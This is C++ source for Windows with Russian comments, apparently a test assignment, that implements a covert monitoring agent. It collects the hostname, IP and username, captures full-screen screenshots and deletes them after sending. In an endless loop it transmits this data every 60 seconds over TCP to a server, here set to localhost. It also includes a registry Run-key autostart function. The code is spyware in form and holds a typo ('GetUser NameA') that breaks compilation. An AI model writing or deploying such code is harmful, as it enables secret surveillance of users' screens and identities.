#include <iostream> // Подключение библиотеки для ввода-вывода
#include <string> // Подключение библиотеки для работы со строками
#include <winsock2.h> // Подключение библиотеки для работы с сокетами Windows
#include <ws2tcpip.h> // Подключение библиотеки для работы с TCP/IP сокетами
#include <thread> // Подключение библиотеки для работы с потоками
#include <fstream> // Подключение библиотеки для работы с файлами
#include <ctime> // Подключение библиотеки для работы с временем
#include <iomanip> // Подключение библиотеки для форматирования вывода
#include <sstream> // Подключение библиотеки для работы с потоками строк
#include <chrono> // Подключение библиотеки для работы с временем
#include <cstring> // Подключение библиотеки для работы с C-строками
#include <windows.h> // Подключение библиотеки для работы с Windows API
#include <filesystem> // Подключение библиотеки для работы с файловой системой

#pragma comment(lib, "ws2_32.lib") // Подключение библиотеки Winsock для работы с сокетами

// Функция автозапуска приложения
void AddToStartup() {
    HKEY hKey; // Переменная для хранения ключа реестра
    const char* appName = "agent_7"; // Имя приложения для автозапуска
    const char* appPath = "C:\\test_zadacha\\build\\release\\agent_7.exe"; // Путь к исполняемому файлу приложения

    // Открываем ключ реестра для добавления записи автозапуска
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        // Добавляем запись о приложении в реестр
        RegSetValueExA(hKey, appName, 0, REG_SZ, (const BYTE*)appPath, strlen(appPath) + 1);
        RegCloseKey(hKey); // Закрываем ключ реестра
    }
}

// Функция получения текущего времени в строковом формате
std::string getCurrentTimeAsString() {
	std::time_t now = std::time(nullptr); // Получаем текущее время
	std::tm* localTime = std::localtime(&now); // Преобразуем его в локальное время
	std::ostringstream oss; // Создаем поток для форматирования строки
	oss << std::put_time(localTime, "%Y-%m-%d_%H-%M-%S"); // Форматируем время
	return oss.str(); // Возвращаем строку с текущим временем
}

// Функция создания файла с текущим временем
void createFileWithCurrentTime(const std::string& systemInfo) {
    std::string currentTime = getCurrentTimeAsString(); // Получаем текущее время
    std::string fileName = currentTime + ".txt"; // Формируем имя файла

    std::ofstream outFile(fileName); // Открываем файл для записи
    if (outFile.is_open()) { // Проверяем, успешно ли открыт файл
        outFile << "Время создания файла: " << currentTime << std::endl; // Записываем время создания файла
        outFile << "Информация о системе клиента: " << systemInfo << std::endl; // Записываем информацию о системе
        outFile.close(); // Закрываем файл
    }
}

// Функция получения информации о системе
std::string GetSystemInfo() {
    WSADATA wsaData; // Структура для хранения информации о версии Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) { // Инициализация Winsock
        return "Ошибка инициализации Winsock"; // Возвращаем ошибку, если инициализация не удалась
    }

    char hostname[256]; // Массив для хранения имени хоста
    if (gethostname(hostname, sizeof(hostname)) != 0) { // Получаем имя хоста
        WSACleanup(); // Очистка Winsock
        return "Ошибка получения имени хоста"; // Возвращаем ошибку, если получение имени хоста не удалось
    }

    // Получаем IP адрес 
    struct addrinfo hints, *res; // Структуры для хранения информации о адресах
    memset(&hints, 0, sizeof hints); // Очистка структуры 
    hints.ai_family = AF_INET; // Устанавливаем IPv4 
    hints.ai_socktype = SOCK_STREAM; // Устанавливаем тип сокета

    if (getaddrinfo(hostname, NULL, &hints, &res) != 0) { // Получаем адреса
        WSACleanup(); // Очистка Winsock
        return "Ошибка получения IP адреса"; // Возвращаем ошибку, если получение адреса не удалось
    }

    char ip[INET_ADDRSTRLEN]; // Массив для хранения IP адреса
    if (inet_ntop(AF_INET, &((struct sockaddr_in*)res->ai_addr)->sin_addr, ip, sizeof(ip)) == NULL) { // Преобразуем адрес в строку
        freeaddrinfo(res); // Освобождаем память
        WSACleanup(); // Очистка Winsock
        return "Ошибка преобразования IP адреса"; // Возвращаем ошибку, если преобразование не удалось
    }
    freeaddrinfo(res); // Освобождение памяти после использования

    // Получаем имя пользователя 
    char username[256]; // Массив для хранения имени пользователя
    DWORD username_len = sizeof(username); // Размер массива
    if (GetUser NameA(username, &username_len) == 0) { // Получаем имя пользователя
        WSACleanup(); // Очистка Winsock
        return "Ошибка получения имени пользователя"; // Возвращаем ошибку, если получение имени пользователя не удалось
    }

    // Завершение работы Winsock 
    WSACleanup(); // Очистка Winsock

    // Формируем и возвращаем строку с информацией о системе
    return std::string("Host: ") + hostname + ", IP: " + ip + ", User: " + username; 
}

// Функция для создания скриншота
void TakeScreenshotAndSend(const std::string& serverIP, int serverPort) {
	HDC hScreenDC = GetDC(NULL); // Получаем контекст устройства для экрана
	HDC hMemoryDC = CreateCompatibleDC(hScreenDC); // Создаем совместимый контекст памяти
	int width = GetDeviceCaps(hScreenDC, HORZRES); // Получаем ширину экрана
	int height = GetDeviceCaps(hScreenDC, VERTRES); // Получаем высоту экрана
	HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height); // Создаем битмап совместимого размера
	SelectObject(hMemoryDC, hBitmap); // Выбираем битмап в контекст памяти
	BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY); // Копируем содержимое экрана в битмап

	std::ofstream file("screenshot.bmp", std::ios::binary); // Открываем файл для записи скриншота в бинарном режиме
	BITMAPFILEHEADER bmfHeader; // Заголовок файла битмапа
	BITMAPINFOHEADER bi; // Заголовок информации о битмапе

	bi.biSize = sizeof(BITMAPINFOHEADER); // Устанавливаем размер заголовка информации
	bi.biWidth = width; // Устанавливаем ширину битмапа
	bi.biHeight = height; // Устанавливаем высоту битмапа
	bi.biPlanes = 1; // Устанавливаем количество цветовых плоскостей
	bi.biBitCount = 24; // Устанавливаем количество бит на пиксель
	bi.biCompression = BI_RGB; // Устанавливаем тип сжатия
	bi.biSizeImage = 0; // Размер изображения (не используется)
	bi.biXPelsPerMeter = 0; // Горизонтальное разрешение (не используется)
	bi.biYPelsPerMeter = 0; // Вертикальное разрешение (не используется)
	bi.biClrUsed = 0; // Количество используемых цветов (не используется)
	bi.biClrImportant = 0; // Количество важных цветов (не используется)

	// Вычисляем размер данных битмапа
	int size = ((width * bi.biBitCount + 31) / 32) * 4 * height; 
	char* data = new char[size]; // Создаем массив для хранения данных битмапа
	GetDIBits(hMemoryDC, hBitmap, 0, height, data, (BITMAPINFO*)&bi, DIB_RGB_COLORS); // Получаем данные битмапа

	// Заполняем заголовок файла битмапа
	bmfHeader.bfType = 0x4D42; // Устанавливаем тип файла (BM)
	bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + size; // Общий размер файла
	bmfHeader.bfReserved1 = 0; // Резервируем 1
	bmfHeader.bfReserved2 = 0; // Резервируем 2
	bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER); // Смещение до данных изображения

	// Записываем заголовок и данные в файл
	file.write((char*)&bmfHeader, sizeof(BITMAPFILEHEADER)); // Записываем заголовок файла
	file.write((char*)&bi, sizeof(BITMAPINFOHEADER)); // Записываем заголовок информации
	file.write(data, size); // Записываем данные изображения
	file.close(); // Закрываем файл

	delete[] data; // Освобождаем память, выделенную для данных битмапа
	DeleteObject(hBitmap); // Удаляем объект битмапа
	DeleteDC(hMemoryDC); // Удаляем контекст памяти
	ReleaseDC(NULL, hScreenDC); // Освобождаем контекст экрана

	// Инициализация Winsock для отправки скриншота на сервер
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData); // Инициализация Winsock
	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0); // Создание сокета
	sockaddr_in serverAddr; // Структура для хранения адреса сервера
	serverAddr.sin_family = AF_INET; // Устанавливаем семейство адресов
	serverAddr.sin_port = htons(serverPort); // Устанавливаем порт сервера
	inet_pton(AF_INET, serverIP.c_str(), &serverAddr.sin_addr); // Преобразуем IP адрес сервера в бинарный формат

	if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) != SOCKET_ERROR) { // Подключаемся к серверу
		std::ifstream screenshotFile("screenshot.bmp", std::ios::binary); // Открываем файл скриншота
		if (screenshotFile) { // Проверяем, успешно ли открыт файл
			screenshotFile.seekg(0, std::ios::end); // Переходим в конец файла
			size_t size = screenshotFile.tellg(); // Получаем размер файла
			screenshotFile.seekg(0, std::ios::beg); // Возвращаемся в начало файла

			char* buffer = new char[size]; // Создаем буфер для хранения данных файла
			screenshotFile.read(buffer, size); // Читаем данные файла в буфер
			send(sock, buffer, size, 0); // Отправляем данные на сервер
			delete[] buffer; // Освобождаем память
		}
		screenshotFile.close(); // Закрываем файл скриншота
		DeleteFile("screenshot.bmp"); // Удаляем файл скриншота
	}

	closesocket(sock); // Закрываем сокет
	WSACleanup(); // Очистка Winsock
}

// Функция для отправки данных на сервер
void SendDataToServer(const std::string& data) {
    WSADATA wsaData; // Структура для хранения информации о версии Winsock
    WSAStartup(MAKEWORD(2, 2), &wsaData); // Инициализация Winsock
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0); // Создание сокета
    
    sockaddr_in serverAddr; // Структура для хранения адреса сервера
    serverAddr.sin_family = AF_INET; // Устанавливаем семейство адресов
    serverAddr.sin_port = htons(8080); // Устанавливаем порт сервера
    inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr); // Преобразуем IP сервера в бинарный формат

    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) { // Подключаемся к серверу
        std::cerr << "Connection to server failed!" << std::endl; // Выводим сообщение об ошибке
        closesocket(sock); // Закрываем сокет
        WSACleanup(); // Очистка Winsock
        return; // Завершаем выполнение функции
    }

    send(sock, data.c_str(), data.size(), 0); // Отправляем данные на сервер
    
    closesocket(sock); // Закрываем сокет
    WSACleanup(); // Очистка Winsock
}

// Отправка скриншота на сервер
void SendScreenshotToServer(const std::string& filename) {
    WSADATA wsaData; // Структура для хранения информации о версии Winsock
    WSAStartup(MAKEWORD(2, 2), &wsaData); // Инициализация Winsock
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0); // Создание сокета

    sockaddr_in serverAddr; // Структура для хранения адреса сервера
    serverAddr.sin_family = AF_INET; // Устанавливаем семейство адресов
    serverAddr.sin_port = htons(8080); // Устанавливаем порт сервера
    inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr); // Преобразуем IP сервера в бинарный формат

    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) { // Подключаемся к серверу
        std::cerr << "Connection to server failed!" << std::endl; // Выводим сообщение об ошибке
        closesocket(sock); // Закрываем сокет
        WSACleanup(); // Очистка Winsock
        return; // Завершаем выполнение функции
    }

    std::ifstream file(filename, std::ios::binary); // Открываем файл для чтения в бинарном режиме
    if (file) { // Проверяем, успешно ли открыт файл
        file.seekg(0, std::ios::end); // Переходим в конец файла
        size_t size = file.tellg(); // Получаем размер файла
        file.seekg(0, std::ios::beg); // Возвращаемся в начало файла
        
        char* buffer = new char[size]; // Создаем буфер для хранения данных файла
        file.read(buffer, size); // Читаем данные файла в буфер
        send(sock, buffer, size, 0); // Отправляем данные на сервер
        delete[] buffer; // Освобождаем память
    }

    closesocket(sock); // Закрываем сокет
    WSACleanup(); // Очистка Winsock
}

// Основная функция приложения
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	// AddToStartup(); // Вызываем функцию автозапуска (раскомментируйте, если нужно)

	std::string systemInfo = GetSystemInfo(); // Получаем информацию о системе
	createFileWithCurrentTime(systemInfo); // Создаем файл с информацией о системе

	while (true) { // Бесконечный цикл для периодической отправки данных
		std::string systemInfo = GetSystemInfo(); // Получаем информацию о системе
		SendDataToServer(systemInfo); // Отправляем информацию о системе на сервер

		TakeScreenshotAndSend("127.0.0.1", 8080); // Отправляем скриншот на сервер

		std::this_thread::sleep_for(std::chrono::seconds(60)); // Ждем 60 секунд перед следующей отправкой
	}

	return 0; // Завершаем выполнение программы
}
